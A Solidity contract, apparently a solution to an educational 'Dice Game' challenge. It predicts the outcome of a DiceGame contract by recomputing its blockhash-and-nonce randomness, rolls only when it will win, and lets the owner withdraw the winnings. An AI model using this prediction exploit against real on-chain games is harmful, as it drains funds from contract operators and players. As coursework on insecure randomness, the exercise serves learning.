//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether,"not enough eth");
        bytes32 prevHash = blockhash(block.number-1);
        uint256 nonce = diceGame.nonce();
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        uint256 roll = uint256(hash) % 16;
        /*if (roll <= 2 ) {
            diceGame.rollTheDice{value: 0.002 ether}();
        }*/
        require (roll <= 2, "roll > 2");
        diceGame.rollTheDice{value: 0.002 ether}();
    }

    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        (bool sent, ) = _addr.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    receive() external payable {}    
}
